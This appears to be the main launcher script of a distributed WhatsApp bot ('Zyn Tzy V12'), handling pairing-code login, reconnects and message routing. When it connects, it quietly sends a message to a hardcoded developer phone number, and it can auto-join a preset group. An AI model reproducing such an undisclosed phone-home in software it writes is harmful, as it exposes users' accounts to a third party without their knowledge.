/*
 YANG SEBAR YATIM 
    AWOKAWOK
    
 # SCRIPT ORI ZYNXZO V12/XII
 - DI LARANG RENAME
 - DI LARANG MEMPERJUAL
 - DI LARANG MEMPER SEBAR
 - DI LARANG MEREBUT ISTRI TETANGGA
 
 # THANK YOU
    YANG UDAH SUPPORT ZYNXZO DARI 0
    SEMOGA KALIAN SEHAT SELALU
    
 # NOTE
    SEMOGA KALIAN MEMAHAMI LARANGAN DI ATAS
*/
require("./database/global")

const func = require("./database/place")
const readline = require("readline");
const usePairingCode = true
const question = (text) => {
  const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
  });
  return new Promise((resolve) => {
rl.question(text, resolve)
  })
};

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()
    console.log(chalk.red.bold('╭━━━━┳╮╱╱╭┳━╮╱╭╮\n╰━━╮━┃╰╮╭╯┃┃╰╮┃┃\n╱╱╭╯╭┻╮╰╯╭┫╭╮╰╯┃\n╱╭╯╭╯╱╰╮╭╯┃┃╰╮┃┃\n╭╯━╰━╮╱┃┃╱┃┃╱┃┃┃\n╰━━━━╯╱╰╯╱╰╯╱╰━╯\n╭━━━━┳━━━━┳╮╱╱╭╮\n┃╭╮╭╮┣━━╮━┃╰╮╭╯┃\n╰╯┃┃╰╯╱╭╯╭┻╮╰╯╭╯\n╱╱┃┃╱╱╭╯╭╯╱╰╮╭╯╱\n╱╱┃┃╱╭╯━╰━╮╱┃┃╱╱\n╱╱╰╯╱╰━━━━╯╱╰╯╱╱\n\nZyn Tzy Version 12.0.0\n\nCreated By : Zynxzo Developer\nTelegram : @zynnnxzzzo\nSubscribe Youtube : @zynxzoo'))
const connectionOptions = {
version,
keepAliveIntervalMs: 30000,
printQRInTerminal: !usePairingCode,
logger: pino({ level: "fatal" }),
auth: state,
browser: [ "Ubuntu", "Chrome", "20.0.04" ]   
// browser: ['Chrome (Linux)', '', '']
}
const zyn = func.makeWASocket(connectionOptions)
if(usePairingCode && !zyn.authState.creds.registered) {
		const phoneNumber = await question(chalk.green('\nEnter Your Number\nNumber : '));
		const code = await zyn.requestPairingCode(phoneNumber.trim())
		console.log(chalk.green(`Your Pairing Code : ${code} `))

	}
store.bind(zyn.ev)

zyn.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
zyn.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
zyn.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
start(`1`, `Connecting...`)
} else if (connection === "open") {
success(`1`, `Tersambung`)
zyn.sendMessage(`6285789034010@s.whatsapp.net`, { text: `\`𝗛𝗶 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿\`
  Bot Succes Connecting`})
if (autoJoin) {
zyn.groupAcceptInvite(codeInvite)
}
}
})

zyn.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return zyn.readMessages([m.key])
if (!zyn.public && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
m = func.smsg(zyn, m, store)
require("./ZynTzy")(zyn, m, store)
} catch (err) {
console.log(err)
}
})

zyn.ev.on('contacts.update', (update) => {
for (let contact of update) {
let id = zyn.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

zyn.public = true

zyn.ev.on('creds.update', saveCreds)
return zyn
}

startSesi()

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ', err)
})